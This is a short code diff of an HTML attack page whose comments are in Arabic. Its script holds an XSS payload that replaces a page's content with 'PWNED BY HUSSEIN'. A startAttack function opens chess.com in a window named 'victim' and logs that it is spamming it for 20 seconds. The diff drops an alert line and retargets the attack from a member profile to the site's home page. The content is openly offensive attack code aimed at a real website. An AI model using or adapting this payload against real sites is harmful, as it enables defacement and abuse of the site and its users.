@@ -15,7 +15,6 @@
    <script>
     let payload = `
         // 1. إثبات بصري لا يمكن تجاهله
-        alert('🎯 XSS SUCCESS ON: ' + document.domain);
         document.body.innerHTML = '<h1 style="color:red; font-size:100px; text-align:center; margin-top:20%;">PWNED BY HUSSEIN</h1>';
         document.body.style.backgroundColor = 'yellow';
         
@@ -39,7 +38,7 @@
 
     function startAttack() {
         // نفتح الصفحة اللي إنت أكدت إن فيها الإعلانات
-        let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victim");
+        let victimWin = window.open("https://www.chess.com/", "victim");
 
         console.log("🚀 Attack started... Spaming for 20 seconds.");
 
